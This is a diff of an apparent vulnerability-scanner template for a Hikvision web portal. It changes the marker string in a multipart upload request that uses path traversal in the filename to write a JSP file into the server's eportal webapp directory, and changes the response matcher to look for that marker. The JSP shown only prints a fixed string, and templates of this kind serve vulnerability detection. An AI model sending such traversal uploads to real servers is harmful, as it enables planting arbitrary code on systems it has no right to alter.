@@ -27,7 +27,7 @@ http:
         Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
         Content-Type: application/zip
 
-        <%out.print("{{randstr}}");%>
+        <%out.print("123456");%>
         ------WebKitFormBoundary9PggsiM755PLa54a--
 
       - |
@@ -39,4 +39,4 @@ http:
       - type: word
         part: body
         words:
-          - '{{randstr}}'
+          - '123456'
